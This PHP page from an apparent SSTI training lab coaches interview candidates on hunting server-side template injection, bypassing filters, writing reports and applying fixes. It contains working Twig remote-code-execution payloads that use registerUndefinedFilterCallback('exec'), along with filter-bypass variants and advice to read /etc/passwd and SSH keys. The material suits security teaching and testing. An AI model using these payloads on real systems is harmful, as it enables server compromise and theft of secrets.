<?php
require_once __DIR__ . '/includes/helpers.php';
$page_title = 'S5 Interview Prep — Capstone: SSTI in the Wild';
include __DIR__ . '/includes/header.php';
?>

<div class="page">
  <div class="interview-page">

    <div style="margin-bottom:24px;">
      <a href="/ssti_s5.php" style="font-size:0.82rem;color:var(--text-muted);">&larr; Back to Lab S5</a>
      &nbsp;&nbsp;
      <a href="/index.php" style="font-size:0.82rem;color:var(--text-muted);">Hub</a>
    </div>

    <div class="interview-section">
      <h1 style="font-size:1.4rem;margin-bottom:6px;">Lab S5 — Capstone: SSTI in the Wild</h1>
      <p style="color:var(--text-muted);font-size:0.875rem;">Interview Prep · Full Hunt Methodology &amp; Filter Bypass</p>
    </div>

    <!-- 30-Second Explanation -->
    <div class="interview-section">
      <h2>30-Second Explanation</h2>
      <div class="thirty-sec">
        Real SSTI hunting requires methodology: probe all inputs systematically, identify the engine, find filter bypasses, and use the appropriate gadget. Filtering the <code>{{</code> delimiter does not stop <code>{%set%}</code> in Twig — block tags are a different syntax category that the naive filter misses entirely.
      </div>
    </div>

    <!-- Common Interview Questions -->
    <div class="interview-section">
      <h2>Common Interview Questions</h2>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s5q1">
        <label class="qa-question" for="s5q1">Walk me through finding SSTI on an unknown application.</label>
        <div class="qa-answer">
          <ol style="padding-left:1.2em;line-height:1.9;margin-top:8px;">
            <li><strong>Enumerate all inputs</strong>: URL params, POST body fields, headers (User-Agent, Referer, X-Forwarded-For), cookies, JSON/XML fields, file upload filenames.</li>
            <li><strong>Probe each input</strong> with: <code>{{7*7}}</code>, <code>${7*7}</code>, <code>{7*7}</code>, <code>&lt;%= 7*7 %&gt;</code>. Look for <code>49</code> in the response body, page title, error messages, or other reflected fields.</li>
            <li><strong>Fingerprint the engine</strong>: Use the engine-specific probes to determine Twig vs Jinja2 vs Smarty vs FreeMarker.</li>
            <li><strong>Test for filters</strong>: If basic payloads are stripped, probe for which characters/strings are filtered. Look for alternative syntaxes not caught by the filter.</li>
            <li><strong>Research and apply gadgets</strong>: Use the engine-specific RCE chain for the confirmed version.</li>
            <li><strong>Escalate and exfiltrate</strong>: Read flag files, environment variables, <code>/etc/passwd</code>, or SSH keys as appropriate to scope.</li>
          </ol>
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s5q2">
        <label class="qa-question" for="s5q2">How do you bypass a <code>{{</code> filter in Twig?</label>
        <div class="qa-answer">
          Twig has two distinct tag types: <strong>expression tags</strong> (<code>{{ }}</code>) and <strong>block tags</strong> (<code>{% %}</code>). Filtering <code>{{</code> and <code>}}</code> leaves block tags untouched. The bypass:<br><br>
          <strong>Strategy</strong>: If the template already contains a <code>{{variable}}</code> expression, use <code>{%set variable=RCE_result%}</code> (block tag, not filtered) to populate that variable with your RCE output. The existing <code>{{variable}}</code> in the template then prints it.<br><br>
          <strong>S5 payload</strong>:
          <div class="oneliner" style="margin:10px 0;">{%set output=_self.env.registerUndefinedFilterCallback("exec")%}{%set output=_self.env.getFilter("cat /flags/lab_s5.txt")%}</div>
          The template's own <code>{{output}}</code> then renders the exec result — no <code>{{</code> in the payload at all.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s5q3">
        <label class="qa-question" for="s5q3">What other SSTI filter bypasses exist?</label>
        <div class="qa-answer">
          <ul style="padding-left:1.2em;line-height:1.9;margin-top:8px;">
            <li><strong>URL encoding</strong>: <code>%7B%7B7*7%7D%7D</code> — if the application URL-decodes before filtering, this can bypass string-match filters.</li>
            <li><strong>Double encoding</strong>: <code>%257B%257B</code> — if double-decoded.</li>
            <li><strong>Case manipulation</strong>: Relevant if filters are case-sensitive and the engine accepts mixed case tags (rare in Twig/Jinja2, more relevant in some older engines).</li>
            <li><strong>Whitespace tricks</strong>: Jinja2 allows spaces inside tags: <code>{{\t7*7\t}}</code>. If the filter only checks for exactly <code>{{7</code>, whitespace variants pass through.</li>
            <li><strong>Alternative delimiters</strong>: Some engines allow custom tag delimiters configured by the developer — inspect client-side source for clues.</li>
            <li><strong>Partial template strings</strong>: Inject into a context where part of the tag already exists in the template and your input completes it.</li>
          </ul>
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s5q4">
        <label class="qa-question" for="s5q4">How do you identify which input field is the SSTI sink when there are many fields?</label>
        <div class="qa-answer">
          Test one field at a time with a harmless probe like <code>{{7*7}}</code>. Watch for:<br>
          <ul style="padding-left:1.2em;line-height:1.9;margin-top:8px;">
            <li>The value <code>49</code> appearing anywhere in the response (not just where you'd expect reflection)</li>
            <li>A Twig/template error message referencing the payload</li>
            <li>Unexpected stripping of your payload — a filter is active, which itself hints at a template-rendered field</li>
            <li>Response latency changes when using a heavy payload like <code>{{range(1,100000)|join}}</code></li>
          </ul>
          In S5: the other fields (<code>username</code>, <code>email</code>, <code>website</code>) are HTML-escaped with <code>h()</code> and never touch the template engine. Probing <code>bio</code> with <code>{{7*7}}</code> would return <code>49</code> if not for the filter — but the filter's presence (stripping <code>{{</code> and <code>}}</code>) is itself a signal that the field goes through a template.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="s5q5">
        <label class="qa-question" for="s5q5">How would you report SSTI in a bug bounty or pentest report?</label>
        <div class="qa-answer">
          A strong SSTI report includes:
          <ol style="padding-left:1.2em;line-height:1.9;margin-top:8px;">
            <li><strong>Proof of evaluation</strong>: A safe math probe (<code>{{7*7}}</code> → <code>49</code>) with a screenshot — proves the vulnerability without harmful execution.</li>
            <li><strong>Proof of RCE</strong>: Output of <code>id</code> command, or reading a benign file like <code>/etc/hostname</code>. Never read actual sensitive data beyond what's needed for scope.</li>
            <li><strong>Affected parameter</strong>: Full request (method, endpoint, parameter name, payload).</li>
            <li><strong>Impact statement</strong>: "Full server compromise — arbitrary code execution as the web process user; ability to read secrets, pivot to internal network, exfiltrate data."</li>
            <li><strong>Remediation</strong>: Static template with variable substitution; sandbox extension if user templates are required.</li>
            <li><strong>CVSS score</strong>: Typically Critical (9.0+) for unauthenticated SSTI with RCE.</li>
          </ol>
        </div>
      </div>
    </div>

    <!-- One-Liners -->
    <div class="interview-section">
      <h2>Full Hunt Methodology Payloads</h2>
      <div style="display:flex;flex-direction:column;gap:8px;">
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">Safe eval probe</div>
          <div class="oneliner">{{7*7}}</div>
        </div>
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">Filter bypass — block tag {%set%} populating existing {{output}}</div>
          <div class="oneliner">{%set output=_self.env.registerUndefinedFilterCallback("exec")%}{%set output=_self.env.getFilter("cat /flags/lab_s5.txt")%}</div>
        </div>
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">Confirm RCE identity</div>
          <div class="oneliner">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</div>
        </div>
        <div>
          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:3px;">URL-encoded bypass attempt</div>
          <div class="oneliner">%7B%7B7*7%7D%7D</div>
        </div>
      </div>
    </div>

    <!-- Developer Fix -->
    <div class="interview-section">
      <h2>Developer Fix</h2>
      <div style="font-size:0.875rem;color:var(--text-muted);line-height:1.7;">
        <p style="margin-bottom:10px;"><strong>Filtering is not a fix for SSTI</strong> — it's a band-aid that is easily bypassed. The only real fix is architectural:</p>
        <ul style="padding-left:1.2em;line-height:1.9;">
          <li>Use static templates; pass user data as template variables, never as template structure.</li>
          <li>If a filter must exist, it must deny all template syntax — not just <code>{{</code> and <code>}}</code>. Any incomplete blocklist can be bypassed.</li>
          <li>Enable the Twig Sandbox extension with an explicit allowlist if user-defined logic templates are required.</li>
          <li>Run the web application process with minimal OS privileges — even successful RCE should hit a hardened boundary (read-only filesystem, no outbound network, container isolation).</li>
        </ul>
      </div>
    </div>

    <!-- Red Flags -->
    <div class="interview-section">
      <h2>Interview Red Flags</h2>
      <div style="display:flex;flex-direction:column;gap:8px;">
        <div class="red-flag-item">&#9888; Not testing all input fields — assuming only obvious ones (search, name) are injectable.</div>
        <div class="red-flag-item">&#9888; Giving up when <code>{{7*7}}</code> is filtered without trying alternative tag types (<code>{%</code>, <code>{#</code>).</div>
        <div class="red-flag-item">&#9888; Thinking client-side filtering (JavaScript) prevents SSTI — the filter must be server-side and correct.</div>
        <div class="red-flag-item">&#9888; Proposing blocklist-based filtering as the fix — interviewers know blocklists are bypassable.</div>
        <div class="red-flag-item">&#9888; Not knowing the difference between Twig's <code>{{ }}</code> expression tags and <code>{% %}</code> block tags.</div>
      </div>
    </div>

    <div style="margin-top:24px;">
      <a href="/ssti_s5.php" class="btn btn-primary btn-sm">Go to Lab S5</a>
      &nbsp;
      <a href="/index.php" class="btn btn-ghost btn-sm">Hub</a>
    </div>

  </div>
</div>

<?php include __DIR__ . '/includes/footer.php'; ?>
